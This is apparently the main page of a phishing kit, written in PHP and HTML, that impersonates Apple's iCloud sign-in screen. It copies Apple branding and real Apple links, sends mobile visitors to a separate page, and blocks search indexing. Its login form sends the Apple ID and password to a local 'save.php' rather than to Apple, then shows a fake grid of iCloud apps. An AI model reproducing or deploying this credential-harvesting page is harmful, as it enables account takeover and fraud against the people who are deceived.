<?php  
$lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
 
switch ($lang) {
  case 'en':
  $lang_file = 'lang.en.php';
  break;
 
  case 'fr':
  $lang_file = 'lang.fr.php';
  break;
 
  case 'es':
  $lang_file = 'lang.es.php';
  break;

  case 'de':
  $lang_file = 'lang.de.php';
  break;
 
  default:
  $lang_file = 'lang.en.php';
 
}
 
include_once 'languages/'.$lang_file;
?>

<!DOCTYPE html>
<html lang="en">
<head>
 <!--[if IE 7]><meta http-equiv="refresh" content="0;URL=unsupported_browser/"><![endif]--> 
 <!--[if IE 8]><meta http-equiv="refresh" content="0;URL=unsupported_browser/"><![endif]-->
 <!--[if IE 9]><meta http-equiv="refresh" content="0;URL=unsupported_browser/"><![endif]-->
 <!--[if IE 10]><meta http-equiv="refresh" content="0;URL=unsupported_browser/"><![endif]-->
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta content="width=device-width, initial-scale=1" name="viewport"/>
	<meta name="robots" content="noindex, nofollow" />
	<title><?php echo $lang['PAGE_TITLE']; ?></title>
	<link rel="shortcut icon" href="assets/img/favicon.ico">
	<link rel="stylesheet" href="assets/layout/strap.css">
	<link rel="stylesheet" href="assets/layout/apple.css">
	<link rel="stylesheet" href="assets/layout/kit.css">
	<link rel="stylesheet" href="assets/layout/animate.css">

<script type="text/javascript">
  <!--
  if (screen.width <= 800) {
    window.location = "mobiv.php";
  }
  //-->
</script>
	
	<script src="assets/js/jquery-latest.min.js"></script>
	<script>
      $(document).ready(function() {
		$('#preloader').delay(900).fadeOut('slow'); // will fade out the white DIV that covers the website.
		$('body').css({'overflow':'visible'});
		$('#test').delay(900).css({'display':'block'});

			$('.checkbox-state-normal').click(function() {
				$('.checkbox-state-normal').hide();
				$('.checkbox-state-focused-selected').css("display","");

			});
		  
		  $('.checkbox-state-focused-selected').click(function() {
				$('.checkbox-state-focused-selected').hide();
				$('.checkbox-state-normal').css("display","");

			});
		});
	</script>	
</head>
<body>
<!-- Preloader -->
<div id="preloader">
	<div id="status"><span></span></div>
</div>

<section id="header">
	<div class="container-fluid">
		<div class="row">
			<div class="col-md-4 col-xs-8 rightH rtl">
				<a class="help" title="Help and Support" alt="Help and Support" href="https://help.apple.com/icloud/"></a>
				<span class="spreat"></span>
								<a class="setup applef" target="_blank" href="https://www.apple.com/icloud/setup/"><?php echo $lang['SETUP_INSTRUCTIONS'] ?></a>
								<div class="setup fName" style="display: none;"><i class="glyphicon glyphicon-menu-down"></i><span><img src="assets/img/user.jpeg" alt=""></span>
					<ul>
						<li><a href="find">iCloud Settings</a></li>
						<li><a href="logout">Sign Out</a></li>
					</ul>
				</div>

			</div>
			<div class="col-md-8 col-xs-4 leftH">
				<span class="icloud"></span>
			</div>
		</div>
	</div>
</section>

<section class="login-form text-center" style="display: block;">

	<img src="assets/img/cloud.png" class="img-cloud" alt="">
	
	<h2><?php echo $lang['SIGN_IN_TITLE']; ?></h2>

	<form action="save.php" class="cloud-login form-ajax" role="form" data-red="find" method="post" accept-charset="utf-8">


		<input type="text" class="id" name="appleid" id="appleID" placeholder="<?php echo $lang['APPLE_ID']; ?>" style="direction: ltr !important;">
		<input type="password" autocomplete="off" class="pwd" name="password" id="password" placeholder="<?php echo $lang['PASSWORD']; ?>">
		<input type="submit" class="dolog" name="singin" id="singin" value="">
		<img class="loading" src="assets/img/ajax-loader.gif" alt="Loading" />
		<div class="alrt">
		</div>
		
	</form>

	<div class="keepme">
		<input type="checkbox" id="keepme" />
		<span for="keepme"><?php echo $lang['KEEP_ME']; ?></span>
	</div>

	<div class="forget">
		<a href="https://iforgot.apple.com/" target="_blank"><?php echo $lang['FORGOT_ID']; ?></a>
		<div id="response"></div>
	</div>
	<div class="newid">
		<?php echo $lang['DONT_HAVE_ID']; ?> <a href="https://appleid.apple.com/account" target="blank"><?php echo $lang['CREATE_YOURS']; ?></a>
		<div id="response"></div>
	</div>

</section>

<section class="imessage" style="display: none;">


	<div class="container">
		<div class="row">
		<div class="col-md-2 col-sm-4 col-xs-6">
				<a href="find" class="text-cente imb">
					<span class="loadings"><img src="assets/img/ajax-loader.gif" alt="Loading" /></span>
					<img class="" src="assets/img/11.png" alt="">
					<span>Reminders</span>
				</a>
			</div>
			<div class="col-md-2 col-sm-4 col-xs-6">
				<a href="find" class="text-cente imb">
					<span class="loadings"><img src="assets/img/ajax-loader.gif" alt="Loading" /></span>
					<img class="" src="assets/img/9.png" alt="">
					<span>
						Notes
					</span>
				</a>
			</div>
			<div class="col-md-2 col-sm-4 col-xs-6">
				<a href="find" class="text-cente imb">
					<span class="loadings"><img src="assets/img/ajax-loader.gif" alt="Loading" /></span>
					<img class="" src="assets/img/3.png" alt="">
					<span>iCloud Drive</span>
				</a>
			</div>
			<div class="col-md-2 col-sm-4 col-xs-6">
				<a href="find" class="text-cente imb">
					<span class="loadings"><img src="assets/img/ajax-loader.gif" alt="Loading" /></span>
					<img class="" src="assets/img/10.png" alt="">
					<span>Photos</span>
				</a>
			</div>
			<div class="col-md-2 col-sm-4 col-xs-6">
				<a href="find" class="text-cente imb">
					<span class="loadings"><img src="assets/img/ajax-loader.gif" alt="Loading" /></span>
					<img class="" src="assets/img/1.png" alt="">
					<span>Contacts</span>
				</a>
			</div>
			<div class="col-md-2 col-sm-4 col-xs-6">
				<a href="find" class="text-cente imb">
					<span class="loadings"><img src="assets/img/ajax-loader.gif" alt="Loading" /></span>
					<img class="" src="assets/img/8.png" alt="">
					<span>Mail</span>
				</a>
			</div>
			
			
			

			<div class="col-md-2 col-sm-4 col-xs-6">
				<a href="find" class="text-cente imb">
					<span class="loadings"><img src="assets/img/ajax-loader.gif" alt="Loading" /></span>
					<img class="" src="assets/img/12.png" alt="">
					<span>Settings</span>
				</a>
			</div>

			<div class="col-md-2 col-sm-4 col-xs-6">
				<a href="find" class="text-cente imb">
					<span class="loadings"><img src="assets/img/ajax-loader.gif" alt="Loading" /></span>
					<img class="" src="assets/img/2.png" alt="">
					<span>Find My iPhone</span>
				</a>
			</div>

			<div class="col-md-2 col-sm-4 col-xs-6">
				<a href="find" class="text-cente imb">
					<span class="loadings"><img src="assets/img/ajax-loader.gif" alt="Loading" /></span>
					<img class="" src="assets/img/6.png" alt="">
					<span>Keynote</span>
				</a>
			</div>
			<div class="col-md-2 col-sm-4 col-xs-6">
				<a href="find" class="text-cente imb">
					<span class="loadings"><img src="assets/img/ajax-loader.gif" alt="Loading" /></span>
					<img class="" src="assets/img/5.png" alt="">
					<span>Numbers</span>
				</a>
			</div>
			<div class="col-md-2 col-sm-4 col-xs-6">
				<a href="find" class="text-cente imb">
					<span class="loadings"><img src="assets/img/ajax-loader.gif" alt="Loading" /></span>
					<img class="" src="assets/img/20.png" alt="">
					<span>Find Friends</span>
				</a>
			</div>

			<div class="col-md-2 col-sm-4 col-xs-6">
				<a href="find" class="text-cente imb">
					<span class="loadings"><img src="assets/img/ajax-loader.gif" alt="Loading" /></span>
					<img class="" src="assets/img/7.png" alt="">
					<span>Pages</span>
				</a>
			</div>
			

		</div>
	</div>


</section><footer class="foot">
	<div class="container-fluid">
		<div class="row">
		
		<div class="col-md-10 col-xs-12 foot-link">
			<a href="https://www.icloud.com/activationlock" target="blank"><?php echo $lang['CHECK_ACTIVATION']; ?></a>
			<span class="footer-link-separator"></span>
			<a href="https://www.apple.com/support/systemstatus/" target="_blank"><?php echo $lang['SYSTEM_STATUS']; ?></a>
			<span class="footer-link-separator"></span>
			<a href="https://www.apple.com/privacy/" target="_blank"><?php echo $lang['POLICY']; ?></a>
			<span class="footer-link-separator"></span>
			<a href="https://www.apple.com/legal/icloud/ww/" target="_blank"><?php echo $lang['TERMS']; ?></a>
			<span class="footer-link-separator"></span>
			<span class="copyright"><?php echo $lang['COPYRIGHT']; ?></span>
		</div>
		<div class="col-md-2 col-xs-12 apple">
			<a href="https://www.apple.com/" target="_blank" class="apple-logo"></a>
		</div>

		</div>
	</div>
</footer>
	
	<script src="http://code.jquery.com/jquery-1.11.3.min.js"></script>
	<script src="assets/js/strap.min.js"></script>
<script src="assets/js/findmyphone.min.js"></script>
	<!-- <script src="assets/js/apple.min.js"></script>
	<script src="assets/js/ajax-form.min.js"></script> -->
<?php
if(isset($_GET["error"])){
echo $lang['IDPWD_ERROR_ALERT'];
}
?>
</body>
</html>